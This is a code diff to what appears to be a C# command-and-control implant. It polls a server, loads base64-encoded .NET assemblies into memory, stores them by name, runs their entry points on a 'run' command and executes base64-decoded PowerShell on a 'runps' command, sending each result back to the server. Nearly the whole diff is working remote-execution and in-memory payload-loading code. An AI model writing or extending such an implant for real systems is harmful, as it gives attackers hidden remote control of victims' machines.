@@ -5,10 +5,26 @@ string responseBody;
 int sleep = 2000;
 string server = "http://127.0.0.1:5000";
 
-void assemblyload(string payload) {
+//dictonary of two type
+Dictionary<string, Assembly> loadedasms = new Dictionary<string, Assembly>();
+
+void assemblyload(string payload, string nametosaveitas) {
     try {
         byte[] bytearray = Convert.FromBase64String(payload);
         Assembly asm = Assembly.Load(bytearray);
+        loadedasms.Add(nametosaveitas, asm);
+    } catch (Exception e) {
+        sendmessagetoserver(e.ToString());
+    }
+    return;
+}
+void assemblyrun(string name) {
+    try {
+        if (!loadedasms.ContainsKey(name)) {
+            sendmessagetoserver(name + " assembly not loaded");
+            return;
+        }
+        Assembly asm = loadedasms[name];
         var method = asm.EntryPoint;
         method.Invoke(null, new object[] {new string[] { } });
     } catch (Exception e) {
@@ -23,20 +39,23 @@ void runpowershellscript(string[] arguments) {
     for (var i = 2; i < arguments.Length; i++) {
         therestofarguments += " " + arguments[i];
     }
+        
+    
     byte[] bytearray = Convert.FromBase64String(script);
-    var command = Encoding.UTF8.GetString(bytearray, 0, bytearray.Length);
+    var command = System.Text.Encoding.UTF8.GetString(bytearray, 0, bytearray.Length);
     using (System.Management.Automation.PowerShell ps = System.Management.Automation.PowerShell.Create()) {
         Console.WriteLine(command + therestofarguments);
         ps.AddScript(command + therestofarguments);
         ps.AddCommand("Out-String");
         var results = ps.Invoke();
-
+        
         string returnvalue = "";
         foreach (var result in results) {
             returnvalue += result.ToString() + "\n";
         }
         sendmessagetoserver(returnvalue);
     }
+
 }
 
 //built in command handler function
@@ -51,7 +70,11 @@ bool handlecommands(string command) {
         return true;
     }
     if (splits[0] == "load") {
-        assemblyload(splits[1]);
+        assemblyload(splits[1], splits[2]);
+        return true;
+    }
+    if (splits[0] == "run") {
+        assemblyrun(splits[1]);
         return true;
     }
     if (splits[0] == "runps") {
